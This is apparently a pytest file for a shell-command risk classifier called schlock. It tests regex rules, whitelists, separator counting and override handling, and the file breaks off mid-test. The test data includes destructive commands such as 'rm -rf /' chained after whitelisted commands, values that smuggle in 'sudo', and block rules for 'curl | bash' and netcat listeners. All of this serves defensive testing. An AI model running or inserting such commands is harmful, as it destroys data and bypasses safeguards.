"""Tests for RuleEngine."""

import re
import shutil

import pytest
import yaml

from schlock.core import validator
from schlock.core.parser import BashCommandParser
from schlock.core.rules import RiskLevel, RuleEngine, RuleMatch, SecurityRule, _declared_separators
from schlock.exceptions import ConfigurationError


def _segment_count(command: str) -> int:
    """How many commands the parser finds -- the count validate_command passes the whole-line check.

    Taken from the parser, never written as a literal: a hard-coded count lets a test pass on the
    whitelist data alone, with the count the gate is actually handed never exercised.
    """
    parser = BashCommandParser()
    return len(parser.extract_command_segments(command, parser.parse(command)))


@pytest.fixture
def test_rules_file(tmp_path):
    """Create test rules YAML file."""
    rules = tmp_path / "test_rules.yaml"
    rules.write_text(r"""
whitelist:
  - ^git\s+status

rules:
  - name: test-blocked
    description: Test blocked rule
    risk_level: BLOCKED
    patterns: ['rm\s+-rf\s+/']
    alternatives: ['Do not do this']

  - name: test-high
    description: Test high rule
    risk_level: HIGH
    patterns: ['git\s+push.*--force']
    alternatives: ['Use --force-with-lease']
""")
    return rules


class TestRuleEngine:
    """Test suite for RuleEngine."""

    def test_load_rules_from_yaml(self, test_rules_file):
        """Load rules from valid YAML."""
        engine = RuleEngine(test_rules_file)
        assert len(engine.rules) == 2

    @pytest.mark.parametrize(
        "yaml_content,error_substring",
        [
            ("invalid: yaml: [", "Invalid YAML"),
        ],
    )
    def test_invalid_yaml_raises_error(self, tmp_path, yaml_content, error_substring):
        """Invalid YAML raises ConfigurationError."""
        bad_yaml = tmp_path / "bad.yaml"
        bad_yaml.write_text(yaml_content)
        with pytest.raises(ConfigurationError) as exc:
            RuleEngine(bad_yaml)
        assert error_substring in str(exc.value)

    def test_invalid_regex_raises_error(self, tmp_path):
        """Invalid regex raises ConfigurationError."""
        bad_pattern = tmp_path / "bad_pattern.yaml"
        bad_pattern.write_text("""
rules:
  - name: bad
    description: test
    risk_level: HIGH
    patterns: ['[invalid(regex']
""")
        with pytest.raises(ConfigurationError) as exc:
            RuleEngine(bad_pattern)
        assert "Invalid regex pattern" in str(exc.value)

    @pytest.mark.parametrize(
        "command,should_match,expected_risk",
        [
            ("rm -rf /", True, RiskLevel.BLOCKED),
            ("git push --force", True, RiskLevel.HIGH),
            ("echo hello", False, RiskLevel.SAFE),
        ],
    )
    def test_pattern_matching(self, test_rules_file, command, should_match, expected_risk):
        """Patterns match commands correctly."""
        engine = RuleEngine(test_rules_file)
        match = engine.match_command(command)
        assert match.matched == should_match
        assert match.risk_level == expected_risk

    def test_risk_level_priority(self, tmp_path):
        """Highest risk wins when multiple match."""
        rules = tmp_path / "multi.yaml"
        rules.write_text("""
rules:
  - name: low
    description: Low risk
    risk_level: LOW
    patterns: ['rm']
  - name: high
    description: High risk
    risk_level: HIGH
    patterns: ['rm.*-rf']
""")
        engine = RuleEngine(rules)
        match = engine.match_command("rm -rf test")
        assert match.risk_level == RiskLevel.HIGH

    @pytest.mark.parametrize(
        "command,should_be_whitelisted",
        [
            ("git status", True),
            ("git push", False),
            ("echo test", False),
        ],
    )
    def test_whitelist_override(self, test_rules_file, command, should_be_whitelisted):
        """Whitelist returns SAFE."""
        engine = RuleEngine(test_rules_file)
        assert engine.is_whitelisted(command) == should_be_whitelisted

    def test_is_whitelisted_keeps_prefix_semantics(self, test_rules_file):
        """AC-5: the prefix contract (issue #66) is untouched for single-segment callers."""
        engine = RuleEngine(test_rules_file)
        assert engine.is_whitelisted("git status --short")
        assert engine.is_whitelisted("git status; rm -rf /")

    def test_match_command_can_skip_the_whitelist(self, test_rules_file):
        """use_whitelist=False lets the multi-segment fallback re-check a command whose
        prefix is whitelisted (LAB-2752) without the prefix vouching for the rest."""
        engine = RuleEngine(test_rules_file)
        assert not engine.match_command("git status; rm -rf /").matched
        assert engine.match_command("git status; rm -rf /", use_whitelist=False).matched

    def test_no_match_returns_safe(self, test_rules_file):
        """Unknown commands are safe."""
        engine = RuleEngine(test_rules_file)
        match = engine.match_command("echo hello")
        assert not match.matched
        assert match.risk_level == RiskLevel.SAFE

    def test_nonexistent_file_raises_error(self, tmp_path):
        """Nonexistent rules file raises ConfigurationError."""
        missing_file = tmp_path / "nonexistent.yaml"
        with pytest.raises(ConfigurationError, match="Rules path not found"):
            RuleEngine(missing_file)

    def test_invalid_yaml_root_raises_error(self, tmp_path):
        """YAML with non-dict root raises ConfigurationError."""
        bad_yaml = tmp_path / "bad_root.yaml"
        bad_yaml.write_text("- just a list")
        with pytest.raises(ConfigurationError, match="YAML root must be a dictionary"):
            RuleEngine(bad_yaml)

    def test_empty_directory_raises_configuration_error(self, tmp_path):
        """Empty rules directory raises ConfigurationError."""
        # Create an empty directory - RuleEngine auto-detects directories
        empty_dir = tmp_path / "empty_rules_dir"
        empty_dir.mkdir()
        with pytest.raises(ConfigurationError, match="No YAML files found"):
            RuleEngine(empty_dir)

    def test_empty_rules_logs_warning(self, tmp_path, caplog):
        """Empty rules YAML logs warning."""
        empty_rules = tmp_path / "empty.yaml"
        empty_rules.write_text("rules: []")
        engine = RuleEngine(empty_rules)
        assert len(engine.rules) == 0
        assert "No rules found" in caplog.text

    def test_invalid_whitelist_pattern_raises_error(self, tmp_path):
        """Invalid whitelist regex raises ConfigurationError."""
        bad_whitelist = tmp_path / "bad_whitelist.yaml"
        bad_whitelist.write_text("""
whitelist:
  - '[invalid(regex'
rules: []
""")
        with pytest.raises(ConfigurationError, match="Invalid whitelist regex pattern"):
            RuleEngine(bad_whitelist)

    def test_rule_not_dict_raises_error(self, tmp_path):
        """Rule that's not a dict raises ConfigurationError."""
        bad_rule = tmp_path / "bad_rule_type.yaml"
        bad_rule.write_text("""
rules:
  - just a string
""")
        with pytest.raises(ConfigurationError, match="Rule at index 0 must be a dictionary"):
            RuleEngine(bad_rule)

    def test_invalid_risk_level_name_raises_error(self, tmp_path):
        """Invalid risk level name raises ConfigurationError."""
        bad_risk = tmp_path / "bad_risk.yaml"
        bad_risk.write_text("""
rules:
  - name: test
    description: Test
    risk_level: INVALID_LEVEL
    patterns: ['test']
""")
        with pytest.raises(ConfigurationError, match="Invalid risk_level: INVALID_LEVEL"):
            RuleEngine(bad_risk)

    def test_missing_required_rule_field_raises_error(self, tmp_path):
        """Missing required rule field raises ConfigurationError."""
        missing_field = tmp_path / "missing_field.yaml"
        missing_field.write_text("""
rules:
  - name: test
    risk_level: HIGH
    patterns: ['test']
""")
        with pytest.raises(ConfigurationError, match="Invalid rule structure at index 0"):
            RuleEngine(missing_field)

    def test_string_literal_filtering(self, test_rules_file):
        """Pattern matches inside string literals are ignored."""
        engine = RuleEngine(test_rules_file)
        # Command contains "rm -rf /" but it's in a quoted string
        match = engine.match_command('echo "rm -rf /"', string_literals=[(6, 15)])
        # Should not match because pattern is inside string literal
        assert not match.matched
        assert match.risk_level == RiskLevel.SAFE

    def test_string_literal_partial_match_not_filtered(self, test_rules_file):
        """Pattern match that partially overlaps string literal is not filtered."""
        engine = RuleEngine(test_rules_file)
        # Pattern starts outside string literal
        match = engine.match_command('rm -rf / "safe"', string_literals=[(9, 15)])
        # Should match because pattern is not ENTIRELY inside string literal
        assert match.matched
        assert match.risk_level == RiskLevel.BLOCKED

    def test_whitelist_with_no_rules(self, tmp_path):
        """Whitelist works even with no rules defined."""
        whitelist_only = tmp_path / "whitelist_only.yaml"
        whitelist_only.write_text(r"""
whitelist:
  - ^git\s+status
""")
        engine = RuleEngine(whitelist_only)
        match = engine.match_command("git status")
        assert not match.matched
        assert match.risk_level == RiskLevel.SAFE
        assert "whitelisted" in match.message.lower()


class TestRiskLevel:
    """Test suite for RiskLevel enum comparisons."""

    def test_risk_level_less_than(self):
        """Test < operator."""
        assert RiskLevel.SAFE < RiskLevel.LOW
        assert RiskLevel.LOW < RiskLevel.MEDIUM
        assert RiskLevel.MEDIUM < RiskLevel.HIGH
        assert RiskLevel.HIGH < RiskLevel.BLOCKED
        assert not RiskLevel.BLOCKED < RiskLevel.SAFE

    def test_risk_level_less_equal(self):
        """Test <= operator."""
        assert RiskLevel.SAFE <= RiskLevel.LOW
        assert RiskLevel.LOW <= RiskLevel.LOW
        assert not RiskLevel.HIGH <= RiskLevel.LOW

    def test_risk_level_greater_than(self):
        """Test > operator."""
        assert RiskLevel.BLOCKED > RiskLevel.HIGH
        assert RiskLevel.HIGH > RiskLevel.MEDIUM
        assert not RiskLevel.SAFE > RiskLevel.HIGH

    def test_risk_level_greater_equal(self):
        """Test >= operator."""
        assert RiskLevel.BLOCKED >= RiskLevel.HIGH
        assert RiskLevel.HIGH >= RiskLevel.HIGH
        assert not RiskLevel.LOW >= RiskLevel.MEDIUM

    def test_risk_level_comparison_with_non_risk_level(self):
        """Comparisons with non-RiskLevel raise TypeError."""
        with pytest.raises(TypeError):
            _ = RiskLevel.HIGH < 5
        with pytest.raises(TypeError):
            _ = RiskLevel.HIGH <= "string"
        with pytest.raises(TypeError):
            _ = RiskLevel.HIGH > 5
        with pytest.raises(TypeError):
            _ = RiskLevel.HIGH >= "string"

    def test_risk_level_comparison_returns_not_implemented(self):
        """Comparison with incompatible types returns NotImplemented."""
        # Test that __lt__ returns NotImplemented for non-RiskLevel types
        result = RiskLevel.HIGH.__lt__(5)
        assert result is NotImplemented

        result = RiskLevel.HIGH.__le__(5)
        assert result is NotImplemented

        result = RiskLevel.HIGH.__gt__(5)
        assert result is NotImplemented

        result = RiskLevel.HIGH.__ge__(5)
        assert result is NotImplemented


class TestSecurityRule:
    """Test suite for SecurityRule validation."""

    def test_security_rule_empty_name_raises_error(self):
        """SecurityRule with empty name raises ValueError."""
        with pytest.raises(ValueError, match="Rule name cannot be empty"):
            SecurityRule(name="", description="Test", risk_level=RiskLevel.HIGH)

    def test_security_rule_empty_description_raises_error(self):
        """SecurityRule with empty description raises ValueError."""
        with pytest.raises(ValueError, match="Rule description cannot be empty"):
            SecurityRule(name="test", description="", risk_level=RiskLevel.HIGH)

    def test_security_rule_invalid_risk_level_raises_error(self):
        """SecurityRule with invalid risk_level raises ValueError."""
        with pytest.raises(ValueError, match="risk_level must be RiskLevel enum"):
            SecurityRule(name="test", description="Test", risk_level="HIGH")


class TestRuleMatch:
    """Test suite for RuleMatch validation."""

    def test_rule_match_matched_without_rule_raises_error(self):
        """RuleMatch with matched=True but no rule raises ValueError."""
        with pytest.raises(ValueError, match="If matched is True, rule must be provided"):
            RuleMatch(matched=True, rule=None, risk_level=RiskLevel.HIGH, message="Test")

    def test_rule_match_not_matched_with_rule_raises_error(self):
        """RuleMatch with matched=False but rule provided raises ValueError."""
        rule = SecurityRule(name="test", description="Test", risk_level=RiskLevel.HIGH)
        with pytest.raises(ValueError, match="If matched is False, rule must be None"):
            RuleMatch(matched=False, rule=rule, risk_level=RiskLevel.SAFE, message="Test")


class TestMultiFileRuleLoading:
    """Test suite for multi-file rule loading from directory."""

    @pytest.fixture
    def rules_directory(self, tmp_path):
        """Create test rules directory with multiple files."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        # Create category files
        (rules_dir / "01_blocked.yaml").write_text(r"""
rules:
  - name: test_rule_blocked
    description: Test blocked rule
    risk_level: BLOCKED
    patterns: ['rm\s+-rf\s+/']
    alternatives: ["Don't do this"]
""")

        (rules_dir / "02_high.yaml").write_text(r"""
rules:
  - name: test_rule_high
    description: Test high risk rule
    risk_level: HIGH
    patterns: ['git\s+push.*--force']
    alternatives: ["Use --force-with-lease"]
""")

        (rules_dir / "03_whitelist.yaml").write_text(r"""
whitelist:
  - ^git\s+status
  - ^ls\b

rules: []
""")

        return rules_dir

    def test_load_rules_from_directory(self, rules_directory):
        """Test loading rules from multiple YAML files."""
        engine = RuleEngine.from_directory(rules_directory)

        assert len(engine.rules) == 2
        assert engine.rules[0].name == "test_rule_blocked"
        assert engine.rules[1].name == "test_rule_high"

    def test_directory_rules_maintain_priority(self, rules_directory):
        """Test that rules from multiple files maintain risk priority."""
        engine = RuleEngine.from_directory(rules_directory)

        # BLOCKED rule should win
        match = engine.match_command("rm -rf /")
        assert match.matched
        assert match.risk_level == RiskLevel.BLOCKED

    def test_directory_whitelist_merged(self, rules_directory):
        """Test that whitelist patterns are merged from all files."""
        engine = RuleEngine.from_directory(rules_directory)

        # Both whitelist patterns should work
        assert engine.is_whitelisted("git status")
        assert engine.is_whitelisted("ls")
        assert not engine.is_whitelisted("git push")

    def test_a_single_command_entry_declares_no_separator_and_clears_no_line(self, rules_directory):
        """`^ls\\b` describes one command, so it can never speak for a line that holds two."""
        engine = RuleEngine.from_directory(rules_directory)

        # The prefix test still clears the single command each pattern was written for --
        # including, and this is the bug it exists to keep out of the fast path, a line that
        # carries a second command.
        assert engine.is_whitelisted("ls -la")
        assert engine.is_whitelisted("ls && rm -rf /")

        # Declaring no separator means speaking for one command, so no line is ever cleared.
        assert not engine.is_whitelisted_whole("ls && rm -rf /", 2)
        assert not engine.is_whitelisted_whole("git status && rm -rf /", 2)

    def test_an_entry_is_held_to_the_number_of_commands_it_declares(self, tmp_path):
        """Anchoring is not sufficient, and neither is merely mentioning a separator."""
        rules_dir = tmp_path / "declared"
        rules_dir.mkdir()
        (rules_dir / "01_whitelist.yaml").write_text(r"""
whitelist:
  - ^rm\s+-rf\s+(dist|build)(/.*)?$
  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+\S+\s+-u\s+\S+\s+--password-stdin$

rules: []
""")
        engine = RuleEngine.from_directory(rules_dir)

        # Anchored AND open-ended: `.*` consumes the chained payload, so this pattern really
        # does fullmatch the whole line. It declares no separator, so it speaks for one
        # command -- note its `|`s are alternation and must not be counted as separators.
        assert engine.whitelist_patterns[0].fullmatch("rm -rf dist/ && rm -rf /")
        assert not engine.is_whitelisted_whole("rm -rf dist/ && rm -rf /", 2)

        # The entry that declares one separator clears its own two-command pipeline...
        pipeline = "gh auth token | docker login ghcr.io -u me --password-stdin"
        assert engine.is_whitelisted_whole(pipeline, 2)
        # ...and `$` matches before a trailing newline, so the command is stripped first.
        assert engine.is_whitelisted_whole(pipeline + "\n", 2)
        # ...but it declared TWO commands, so it cannot speak for a third. `\S+` matches `;`,
        # which is how a payload rides an entry that does write a separator.
        injected = "gh auth token | docker login ghcr.io -u foo;sudo;true --password-stdin"
        assert engine.whitelist_patterns[1].fullmatch(injected)
        assert not engine.is_whitelisted_whole(injected, 4)
        assert not engine.is_whitelisted_whole(pipeline + " && rm -rf /", 3)

    def test_an_entry_declaring_no_separator_clears_nothing_here_even_alone(self, rules_directory):
        """Holds standing alone, not only because the one caller guards `len(segments) > 1`."""
        engine = RuleEngine.from_directory(rules_directory)

        assert engine.is_whitelisted("ls")  # the prefix test is how a single command clears
        assert not engine.is_whitelisted_whole("ls", 1)
        assert not engine.is_whitelisted_whole("ls -la", 1)

    def test_an_unanchored_entry_covers_only_the_arguments_it_described(self, tmp_path):
        """Counting commands says nothing about a command's arguments; the anchor does.

        Every separator-writing pattern schlock ships is also `$`-anchored, so `match` and
        `fullmatch` agree on all of them. A user's own pipeline entry need not be anchored,
        and there only `fullmatch` stops it vouching for arguments it never mentioned.
        """
        rules_dir = tmp_path / "unanchored"
        rules_dir.mkdir()
        (rules_dir / "01_whitelist.yaml").write_text(r"""
whitelist:
  - ^foo\s*\|\s*bar

rules: []
""")
        engine = RuleEngine.from_directory(rules_dir)

        assert engine.is_whitelisted_whole("foo | bar", 2)
        # Two commands, so the count is satisfied -- but the entry never described `-rf /etc`.
        assert not engine.is_whitelisted_whole("foo | bar -rf /etc", 2)

    def test_counting_clears_the_legal_multi_line_spelling_that_a_newline_ban_would_not(self, tmp_path):
        """A newline after `|` is a bash CONTINUATION, not a separator: still two commands."""
        rules_dir = tmp_path / "continuation"
        rules_dir.mkdir()
        (rules_dir / "01_whitelist.yaml").write_text(r"""
whitelist:
  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+\S+\s+--password-stdin$

rules: []
""")
        engine = RuleEngine.from_directory(rules_dir)

        # bash reads this as one two-command pipeline, and so does the count.
        assert engine.is_whitelisted_whole("gh auth token |\n  docker login ghcr.io --password-stdin", 2)
        # But `\s` also spans a line break the author never wrote, turning one regex "command"
        # into several for bash. The count sees through that where the pattern cannot.
        assert not engine.is_whitelisted_whole("gh auth token | docker login\nsudo\n--password-stdin", 4)

    def test_a_bracket_expression_is_a_slot_not_a_declared_separator(self, tmp_path):
        """`[^;]` and `[\\w;]` mention `;` without writing a boundary, so neither declares one."""
        rules_dir = tmp_path / "classes"
        rules_dir.mkdir()
        (rules_dir / "01_whitelist.yaml").write_text(r"""
whitelist:
  - ^mytool\s+[^;]+$
  - ^cd\s+[\w;]+\s*&&\s*make$
  - ^foo\s*[;]\s*bar$

rules: []
""")
        engine = RuleEngine.from_directory(rules_dir)

        # A negated class writes no separator: this entry speaks for one command, however well
        # it matches a longer line.
        assert engine.whitelist_patterns[0].fullmatch("mytool x && rm -rf /")
        assert not engine.is_whitelisted_whole("mytool x && rm -rf /", 2)
        # A class holding `;` among other characters does not add to the one `&&` declares.
        assert engine.is_whitelisted_whole("cd src && make", 2)
        assert not engine.is_whitelisted_whole("cd a;rm && make", 3)
        # A class holding nothing but the separator is the separator.
        assert engine.is_whitelisted_whole("foo; bar", 2)

    def test_whitespace_bash_reads_as_a_word_never_clears_a_line(self, tmp_path):
        """Only space, tab and newline are blank to bash; `\\s` and `strip()` accept far more."""
        rules_dir = tmp_path / "blanks"
        rules_dir.mkdir()
        (rules_dir / "01_whitelist.yaml").write_text(r"""
whitelist:
  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+ghcr\.io\s+-u\s+[A-Za-z0-9._@-]+\s+--password-stdin$

rules: []
""")
        engine = RuleEngine.from_directory(rules_dir)
        pipeline = "gh auth token | docker login ghcr.io -u me --password-stdin"

        assert engine.is_whitelisted_whole(" \t\n" + pipeline + " \t\n", 2)
        for blank in ("\r", "\x0b", "\x0c", "\x1c", "\x1f", "\x85", "\xa0", "\u2028", "\u3000"):
            assert not engine.is_whitelisted_whole(pipeline + "\n" + blank, 2)
            assert not engine.is_whitelisted_whole(blank + "\n" + pipeline, 2)
            assert not engine.is_whitelisted_whole(pipeline.replace("|", "|\n" + blank + "\n"), 2)

    def test_directory_files_loaded_in_order(self, rules_directory):
        """Test that files are loaded in alphabetical order."""
        engine = RuleEngine.from_directory(rules_directory)

        # Files should be loaded in order: 01_, 02_, 03_
        # Check that rules appear in order they were loaded
        rule_names = [rule.name for rule in engine.rules]
        assert rule_names == ["test_rule_blocked", "test_rule_high"]

    def test_nonexistent_directory_raises_error(self, tmp_path):
        """Test that nonexistent directory raises ConfigurationError."""
        missing_dir = tmp_path / "nonexistent"
        with pytest.raises(ConfigurationError, match="Rules directory not found"):
            RuleEngine.from_directory(missing_dir)

    def test_empty_directory_raises_error(self, tmp_path):
        """Test that directory with no YAML files raises ConfigurationError."""
        empty_dir = tmp_path / "empty"
        empty_dir.mkdir()
        with pytest.raises(ConfigurationError, match="No YAML files found"):
            RuleEngine.from_directory(empty_dir)

    def test_directory_with_invalid_yaml_raises_error(self, tmp_path):
        """Test that directory with invalid YAML raises ConfigurationError."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "bad.yaml").write_text("invalid: yaml: [")

        with pytest.raises(ConfigurationError, match="Invalid YAML syntax"):
            RuleEngine.from_directory(rules_dir)

    def test_directory_with_empty_file_skips_file(self, tmp_path):
        """Test that empty files are skipped."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "01_good.yaml").write_text("""
rules:
  - name: test_rule
    description: Test
    risk_level: HIGH
    patterns: ['test']
    alternatives: []
""")
        (rules_dir / "02_empty.yaml").write_text("")

        engine = RuleEngine.from_directory(rules_dir)
        assert len(engine.rules) == 1

    def test_directory_with_invalid_rule_raises_error(self, tmp_path):
        """Test that directory with invalid rule raises ConfigurationError."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "bad_rule.yaml").write_text("""
rules:
  - name: bad
    risk_level: INVALID
    patterns: ['test']
""")

        with pytest.raises(ConfigurationError, match="Failed to load rule"):
            RuleEngine.from_directory(rules_dir)

    def test_backward_compatibility_single_file(self, test_rules_file):
        """Test that single file loading still works."""
        engine = RuleEngine(test_rules_file)
        assert len(engine.rules) == 2
        assert engine.rules[0].name == "test-blocked"

    def test_directory_loading_vs_single_file_equivalent(self, tmp_path):
        """Test that directory loading produces same results as single file."""
        # Create single file
        single_file = tmp_path / "single.yaml"
        single_file.write_text(r"""
whitelist:
  - ^git\s+status

rules:
  - name: test_rule
    description: Test
    risk_level: HIGH
    patterns: ['test']
    alternatives: []
""")

        # Create directory with same content
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()
        (rules_dir / "01_rules.yaml").write_text(r"""
whitelist:
  - ^git\s+status

rules:
  - name: test_rule
    description: Test
    risk_level: HIGH
    patterns: ['test']
    alternatives: []
""")

        # Both should produce identical results
        engine_single = RuleEngine(single_file)
        engine_dir = RuleEngine.from_directory(rules_dir)

        assert len(engine_single.rules) == len(engine_dir.rules)
        assert engine_single.rules[0].name == engine_dir.rules[0].name

        # Both should match commands identically
        match_single = engine_single.match_command("test command")
        match_dir = engine_dir.match_command("test command")

        assert match_single.matched == match_dir.matched
        assert match_single.risk_level == match_dir.risk_level


class TestRuleOverrides:
    """Test suite for rule and category overrides."""

    @pytest.fixture
    def override_engine(self, tmp_path):
        """Create a RuleEngine with known rules across categories for override testing."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "01_destruction.yaml").write_text(r"""
rules:
  - name: system_destruction
    description: Complete filesystem destruction
    risk_level: BLOCKED
    patterns: ['rm\s+-rf\s+/']
    alternatives: ["Don't do this"]

  - name: recursive_delete
    description: Recursive delete of directory
    risk_level: HIGH
    patterns: ['rm\s+-r\s+']
    alternatives: ["Be more specific"]
""")

        (rules_dir / "02_network.yaml").write_text(r"""
rules:
  - name: curl_pipe_bash
    description: Pipe curl to bash
    risk_level: BLOCKED
    patterns: ['curl.*\|\s*bash']
    alternatives: ["Download and inspect first"]

  - name: open_port
    description: Listening on a port
    risk_level: MEDIUM
    patterns: ['nc\s+-l']
    alternatives: ["Use a proper server"]
""")

        return RuleEngine.from_directory(rules_dir)

    # --- Rule-level overrides ---

    def test_upgrade_risk_level(self, override_engine):
        """Rule override can upgrade risk level."""
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"risk_level": "HIGH"}},
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "open_port")
        assert rule.risk_level == RiskLevel.HIGH

    def test_downgrade_non_blocked_rule(self, override_engine):
        """Rule override can downgrade non-BLOCKED rules."""
        override_engine.apply_overrides(
            rule_overrides={"recursive_delete": {"risk_level": "MEDIUM"}},
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "recursive_delete")
        assert rule.risk_level == RiskLevel.MEDIUM

    def test_cannot_downgrade_blocked_rule(self, override_engine):
        """BLOCKED rules cannot be downgraded — security floor."""
        override_engine.apply_overrides(
            rule_overrides={"system_destruction": {"risk_level": "HIGH"}},
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "system_destruction")
        assert rule.risk_level == RiskLevel.BLOCKED

    def test_disable_rule(self, override_engine):
        """Non-BLOCKED rules can be disabled."""
        override_engine.apply_overrides(
            rule_overrides={"recursive_delete": {"enabled": False}},
            category_overrides={},
        )
        assert not any(r.name == "recursive_delete" for r in override_engine.rules)
        assert "recursive_delete" not in override_engine.compiled_patterns

    def test_cannot_disable_blocked_rule(self, override_engine):
        """BLOCKED rules cannot be disabled."""
        override_engine.apply_overrides(
            rule_overrides={"system_destruction": {"enabled": False}},
            category_overrides={},
        )
        assert any(r.name == "system_destruction" for r in override_engine.rules)

    def test_unknown_rule_ignored(self, override_engine, caplog):
        """Unknown rule names are warned and ignored."""
        original_count = len(override_engine.rules)
        override_engine.apply_overrides(
            rule_overrides={"nonexistent_rule": {"risk_level": "HIGH"}},
            category_overrides={},
        )
        assert len(override_engine.rules) == original_count
        assert "unknown rule" in caplog.text.lower()

    def test_invalid_risk_level_ignored(self, override_engine, caplog):
        """Invalid risk_level values are warned and skipped."""
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"risk_level": "SUPER_BLOCKED"}},
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "open_port")
        assert rule.risk_level == RiskLevel.MEDIUM  # Unchanged
        assert "Invalid risk_level" in caplog.text

    def test_empty_overrides_noop(self, override_engine):
        """Empty overrides don't modify anything."""
        original_rules = list(override_engine.rules)
        override_engine.apply_overrides(rule_overrides={}, category_overrides={})
        assert override_engine.rules == original_rules

    def test_preserves_other_fields(self, override_engine):
        """Override only changes specified fields, preserves everything else."""
        override_engine.apply_overrides(
            rule_overrides={"recursive_delete": {"risk_level": "BLOCKED"}},
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "recursive_delete")
        assert rule.description == "Recursive delete of directory"
        assert rule.alternatives == ["Be more specific"]
        assert rule.category == "destruction"

    def test_non_dict_override_value_ignored(self, override_engine):
        """Non-dict override values are ignored gracefully."""
        original_count = len(override_engine.rules)
        override_engine.apply_overrides(
            rule_overrides={"recursive_delete": "not_a_dict"},
            category_overrides={},
        )
        assert len(override_engine.rules) == original_count

    def test_non_dict_category_override_value_ignored(self, override_engine):
        """Non-dict category override values are ignored gracefully."""
        original_count = len(override_engine.rules)
        override_engine.apply_overrides(
            rule_overrides={},
            category_overrides={"network": "not_a_dict"},
        )
        assert len(override_engine.rules) == original_count

    def test_multiple_rule_overrides(self, override_engine):
        """Multiple rules can be overridden simultaneously."""
        override_engine.apply_overrides(
            rule_overrides={
                "open_port": {"risk_level": "HIGH"},
                "recursive_delete": {"enabled": False},
            },
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "open_port")
        assert rule.risk_level == RiskLevel.HIGH
        assert not any(r.name == "recursive_delete" for r in override_engine.rules)

    # --- Category-level overrides ---

    def test_category_override_all_rules(self, override_engine):
        """Category override applies to all rules in that category."""
        override_engine.apply_overrides(
            rule_overrides={},
            category_overrides={"network": {"enabled": False}},
        )
        # open_port (MEDIUM) should be disabled, curl_pipe_bash (BLOCKED) should remain
        assert not any(r.name == "open_port" for r in override_engine.rules)
        assert any(r.name == "curl_pipe_bash" for r in override_engine.rules)

    def test_category_risk_level_override(self, override_engine):
        """Category override can change risk level for all non-BLOCKED rules."""
        override_engine.apply_overrides(
            rule_overrides={},
            category_overrides={"network": {"risk_level": "HIGH"}},
        )
        open_port = next(r for r in override_engine.rules if r.name == "open_port")
        assert open_port.risk_level == RiskLevel.HIGH
        # BLOCKED rule should be unchanged
        curl = next(r for r in override_engine.rules if r.name == "curl_pipe_bash")
        assert curl.risk_level == RiskLevel.BLOCKED

    def test_rule_override_wins_over_category(self, override_engine):
        """Rule-level override takes precedence over category-level."""
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"risk_level": "BLOCKED"}},
            category_overrides={"network": {"risk_level": "LOW"}},
        )
        open_port = next(r for r in override_engine.rules if r.name == "open_port")
        assert open_port.risk_level == RiskLevel.BLOCKED

    def test_rule_risk_level_wins_over_category_blocked_upgrade(self, override_engine):
        """Rule-level risk_level overrides a category upgrade to BLOCKED."""
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"risk_level": "HIGH"}},
            category_overrides={"network": {"risk_level": "BLOCKED"}},
        )
        # open_port was originally MEDIUM, category upgraded to BLOCKED,
        # but rule-level says HIGH — rule wins because original was not BLOCKED
        open_port = next(r for r in override_engine.rules if r.name == "open_port")
        assert open_port.risk_level == RiskLevel.HIGH

    def test_rule_enabled_wins_over_category_disabled(self, override_engine):
        """Rule enabled: true takes precedence over category enabled: false."""
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"enabled": True}},
            category_overrides={"network": {"enabled": False}},
        )
        # open_port should remain because rule-level enabled: true wins
        assert any(r.name == "open_port" for r in override_engine.rules)
        # curl_pipe_bash should also remain because it's originally BLOCKED
        assert any(r.name == "curl_pipe_bash" for r in override_engine.rules)

    def test_unknown_category_ignored(self, override_engine, caplog):
        """Unknown category names are warned and ignored."""
        original_count = len(override_engine.rules)
        override_engine.apply_overrides(
            rule_overrides={},
            category_overrides={"fantasy_category": {"enabled": False}},
        )
        assert len(override_engine.rules) == original_count
        assert "unknown category" in caplog.text.lower()

    def test_cannot_downgrade_blocked_via_category(self, override_engine):
        """BLOCKED rules in a category cannot be downgraded."""
        override_engine.apply_overrides(
            rule_overrides={},
            category_overrides={"destruction": {"risk_level": "MEDIUM"}},
        )
        system_dest = next(r for r in override_engine.rules if r.name == "system_destruction")
        assert system_dest.risk_level == RiskLevel.BLOCKED

    def test_can_disable_rule_upgraded_to_blocked(self, override_engine):
        """Rules upgraded to BLOCKED via override can still be disabled (original was not BLOCKED)."""
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"enabled": False}},
            category_overrides={"network": {"risk_level": "BLOCKED"}},
        )
        # open_port was originally MEDIUM, so it can be disabled even after upgrade
        assert not any(r.name == "open_port" for r in override_engine.rules)

    # --- Category field population ---

    def test_category_populated_during_directory_loading(self, override_engine):
        """Category field populated from filename during directory loading."""
        system_dest = next(r for r in override_engine.rules if r.name == "system_destruction")
        assert system_dest.category == "destruction"
        open_port = next(r for r in override_engine.rules if r.name == "open_port")
        assert open_port.category == "network"

    def test_apply_overrides_is_idempotent(self, override_engine):
        """Repeated apply_overrides uses original risk levels, not mutated ones."""
        # Phase 1: Upgrade open_port to BLOCKED via category
        override_engine.apply_overrides(
            rule_overrides={},
            category_overrides={"network": {"risk_level": "BLOCKED"}},
        )
        rule = next(r for r in override_engine.rules if r.name == "open_port")
        assert rule.risk_level == RiskLevel.BLOCKED

        # Phase 2: Downgrade open_port via rule override
        # Without idempotency fix, this would fail because the engine thinks
